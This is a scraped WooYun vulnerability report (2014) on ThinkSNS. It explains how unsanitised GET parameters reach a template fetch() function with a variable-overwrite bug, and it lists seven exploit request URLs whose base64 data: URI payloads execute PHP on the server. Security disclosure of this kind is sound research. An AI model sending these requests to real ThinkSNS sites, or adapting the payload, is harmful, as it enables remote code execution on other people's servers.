{"id": 48340, "wybug_id": "wooyun-2014-081755", "wybug_title": "ThinkSNS第三弹七处前台GetShell", "wybug_corp": "ThinkSNS", "wybug_author": "猪头子", "wybug_date": "2014-11-02 22:45", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "文件包含漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-07：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： ThinkSNS漏洞系列第三弹，前台对参数处理不当导致getshell。 详细说明：  漏洞点出现在DenounceWidget.class.php里：\\addons\\widget\\DenouceWidget\\DenouceWidget.class.php:23\n/** * 举报弹框 * @return string 弹窗页面HTML */public function index(){    // 获取相关数据    $var = $this->getVar();    $content = $this->renderFile(dirname(__FILE__).\"/index.html\",$var);    return $content;}\n可以看到，index函数主要作用是通过$this->getVar()来获取参数，然后再进入到$this->renderFile(dirname(__FILE__).\"/index.html\",$var)做模板渲染和输出。先看$this->getVar()\\addons\\widget\\DenouceWidget\\DenouceWidget.class.php:56:\n/** * 格式化模板变量 * @return array 被举报的信息 */public function getVar(){    if(empty($_GET['aid']) || empty($_GET['fuid']) || empty($_GET['type'])){        return false;    }    foreach($_GET as $k=>$v){        $var[$k] = t($v);    }    $var['uid'] = $GLOBALS['ts']['mid'];    empty($var['app']) &&  $var['app'] = 'public';    $var['source'] = model('Source')->getSourceInfo($var['type'],$var['aid'],false,$var['app']);    return $var;}\n通过foreach将$_GET合并到$var里，之后返回合并后的数组。接下来进入$this->renderFile(dirname(__FILE__).\"/index.html\",$var)\\core\\OpenSociax\\Widget.class.php:73\n/** * 渲染模板输出 供render方法内部调用 * @access public * @param string $templateFile  模板文件 * @param mixed $var  模板变量 * @param string $charset  模板编码 * @return string */protected function renderFile($templateFile = '', $var = '', $charset = 'utf-8') {    $var['ts'] = $GLOBALS['ts'];    if (! file_exists_case ( $templateFile )) {        // 自动定位模板文件        // $name = substr ( get_class ( $this ), 0, - 6 );        // $filename = empty ( $templateFile ) ? $name : $templateFile;        // $templateFile =   'widget/' . $name . '/' . $filename . C ( 'TMPL_TEMPLATE_SUFFIX' );        // if (! file_exists_case ( $templateFile ))        throw_exception ( L ( '_WIDGET_TEMPLATE_NOT_EXIST_' ) . '[' . $templateFile . ']' );    }    $template = $this->template ? $this->template : strtolower ( C ( 'TMPL_ENGINE_TYPE' ) ? C ( 'TMPL_ENGINE_TYPE' ) : 'php' );    $content = fetch($templateFile,$var,$charset);    return $content;}\n直接把$_GET数组里的变量放入fetch里执行，fetch里存在变量覆盖漏洞，于是就可以get shell了。关于fetch的漏洞细节可以看这里： WooYun: ThinkPHP远程代码执行隐患（需满足特定条件）    漏洞证明：  两种getshell的方法，一种是include包含webshell的图片，一种是使用filter\n/index.php?app=widget&mod=Denouce&act=index&aid=1&fuid=1&type=ztz&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D\n\n\n同样的原理，还有六处分别是在：其他6个：1.POST /index.php?app=widget&mod=Comment&act=addcomment&uid=1app_name=public&table_name=user&content=test&row_id=1&app_detail_summary=1&templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D2.POST /index.php?app=widget&mod=Department&act=changetemplateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D3.POST /index.php?app=widget&mod=Diy&act=addWidgettemplateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D4.POST /index.php?app=widget&mod=FeedList&act=loadMoretemplateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D5.POST /index.php?app=widget&mod=FeedList&act=loadNewtemplateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D&maxId=16.POST /index.php?app=widget&mod=Remark&act=edittemplateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyBleGl0KCk7Pz4%3D   修复方案：  懒得吐槽这么简单的问题一直没修复了   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-02 23:21 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  你终于忍不住发出来了啊    \n     2014-11-02 23:21 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  getTemplateFile?    \n     2014-11-02 23:23 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  thinksns已经被踢出普通厂商了……踢出……出……    \n     2014-11-03 00:26 |    \t\t龍 、 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:135        | 你若安好  我就是晴天)\t\t \n  你终于忍不住发出来了啊     \n     2014-11-03 01:14 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @xfkxfk 话说这个不是高危漏洞是不是可以不写插件    \n     2014-11-03 01:15 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @phith0n 早该踢出了啊。。。    \n     2014-11-03 07:35 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  你们不要欺负sns    \n     2014-11-03 07:42 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  好久不见    \n     2014-11-03 09:25 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @猪头子 危害等级：高 你在蒙大家么？！    \n     2014-11-25 08:33 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @xfkxfk 这个不应该是高？    \n     2014-12-05 20:42 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @猪头子 签名暴露了你自信过后的表情，无空格，报错    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}